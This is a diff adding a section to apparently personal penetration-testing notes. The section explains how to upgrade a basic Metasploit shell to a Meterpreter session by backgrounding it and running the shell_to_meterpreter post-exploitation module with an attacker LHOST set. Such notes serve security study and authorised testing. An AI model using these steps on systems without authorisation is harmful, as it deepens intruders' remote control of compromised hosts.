@@ -62,3 +62,40 @@ There are tons of modules specifically created for post-exploitation. They can b
 ```
 use post/
 ```
+
+### Upgrade a normal shell to metepreter
+
+There is a point in doing stuff through metasploit. For example, if you find a exploit that does not have meterpreter available as a payload you can just start a normal shell and then upgrade it. To do that you do the following:
+
+First you generate a shell through metasploit, either through a specici exploit or through a msfvenom-shell that you upload. Now that you have a normal shell it is time to upgrade it to a meterpreter shell.
+
+First we have to leave the shell but without killing it. So we do
+
+```
+Ctr-z
+Background session 2? [y/N]  y
+```
+
+Now we have that shell running in the background, and you can see it with 
+```
+show sessions
+#or
+sessions -l
+```
+And you can connect to it again with
+
+```
+sessions -i 1
+```
+Or whatever the number of the session is.
+
+So now we have the shell running in the background. It is time to upgrade
+
+```
+use post/multi/manage/shell_to_meterpreter
+set LHOST 192.168.1.102
+set session 1
+exploit
+```
+
+Now metasploit will create a new session with meterpeter that will be available to you.
